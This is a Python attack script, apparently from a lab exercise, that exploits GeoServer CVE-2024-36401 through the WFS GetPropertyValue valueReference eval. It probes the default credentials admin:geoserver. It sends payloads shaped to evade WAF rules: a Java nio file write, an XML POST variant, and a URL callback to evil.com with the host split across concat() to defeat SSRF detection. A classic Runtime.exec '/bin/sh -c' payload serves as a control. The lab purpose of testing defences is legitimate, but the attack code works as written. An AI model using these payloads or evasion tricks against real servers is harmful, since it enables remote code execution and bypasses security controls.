# -*- coding: utf-8 -*-
"""Final round - GeoServer (Task 2a): WAF-pass eval shapes on CVE-2024-36401.

Defender's regression killed classic exec() payloads via 944100/110/120/130
(java.lang.Runtime/getRuntime/ProcessBuilder literals) + 932160/230/235/250
(shell command strings) + 949110. GeoServer's 36401 eval calls Java methods as
`method(receiver, args)` (recorded PoC: exec(Runtime.getRuntime(), String[])),
so static calls on other classes are structurally identical. Variants:

  GS-3  write(java.nio.file.Files, Paths.get('/mnt/geoserver/pwn_joint_gs'),
        'pwn'.getBytes())   -> pure-Java nio file write, no Runtime, no shell
  GS-4  same via POST XML body
  GS-5  getText(new java.net.URL(concat('http://evil','.com:8000/rt/gs_eval_b')))
        -> callback with host split across concat() args to break
           ssrf_userinput's user-input correlation
  GS-6  control: classic exec() shape (expected 403 - proves WAF still holds it)

Truth = /mnt/geoserver marker + infra log + dmesg aa-geoserver delta.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"


def show(label, r):
    txt = r.text
    if len(txt) > 240:
        txt = txt[:120] + "...[" + str(len(txt)) + "B]..." + txt[-100:]
    print("[*] %-44s HTTP %s | %s" % (label, r.status_code, txt.replace("\n", " ")[:220]))


def truth():
    out = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "sh", "-c",
                          "ls -l --full-time /mnt/geoserver/pwn_joint_gs /mnt/geoserver/pwn_joint_gs2 2>/dev/null"],
                         capture_output=True, text=True, errors="replace")
    print("[truth]", (out.stdout + out.stderr).strip() or "(no markers)")
    out = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                         capture_output=True, text=True, errors="replace")
    for line in (out.stdout + out.stderr).splitlines():
        if "gs_eval" in line or "gs_rest" in line:
            print("[infra]", line.strip())
    out = subprocess.run(["docker", "logs", "multi-round-lab-geoserver-1", "--since", "3m"],
                         capture_output=True, text=True, errors="replace")
    for line in (out.stdout + out.stderr).splitlines():
        if "blocked" in line.lower() or "attack" in line.lower():
            print("[rasp]", line.strip()[:180])


# GS-0: REST default creds probe
r = s.get(BASE + "/geoserver/rest/about/version.json",
          auth=("admin", "geoserver"), timeout=60)
show("GS-0 REST version (admin:geoserver)", r)

# GS-6: classic control (expect CRS 403)
x = ("exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{'/bin/sh','-c',"
     "'touch /tmp/joint_ctl'})")
r = s.get(BASE + "/geoserver/ows", params={
    "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
    "typeNames": "sf:archsites", "valueReference": x}, timeout=90)
show("GS-6 control classic exec()", r)

# GS-3: nio write via method-as-function eval
v = "write(java.nio.file.Files,java.nio.file.Paths.get('/mnt/geoserver/pwn_joint_gs'),'pwn'.getBytes())"
r = s.get(BASE + "/geoserver/ows", params={
    "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
    "typeNames": "sf:archsites", "valueReference": v}, timeout=90)
show("GS-3 nio write (GET)", r)

# GS-5: callback with split host
v5 = ("getText(new java.net.URL(concat('http://evil',"
      "'.com:8000/rt/gs_eval_b')))")
r = s.get(BASE + "/geoserver/ows", params={
    "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
    "typeNames": "sf:archsites", "valueReference": v5}, timeout=90)
show("GS-5 split-host URL callback", r)

# GS-4: nio write via POST XML
body = (
    '<wfs:GetPropertyValue xmlns:sf="http://cite.opengeospatial.org/gmlsf"'
    ' xmlns:wfs="http://www.opengis.net/wfs/2.0"'
    ' service="WFS" version="2.0.0" valueReference="'
    + "write(java.nio.file.Files,java.nio.file.Paths.get('/mnt/geoserver/pwn_joint_gs2'),'pwn2'.getBytes())"
    + '"><wfs:Query typeNames="sf:archsites"/></wfs:GetPropertyValue>'
)
r = s.post(BASE + "/geoserver/ows", data=body,
           headers={"Content-Type": "application/xml"}, timeout=90)
show("GS-4 nio write (POST xml)", r)

time.sleep(2)
truth()
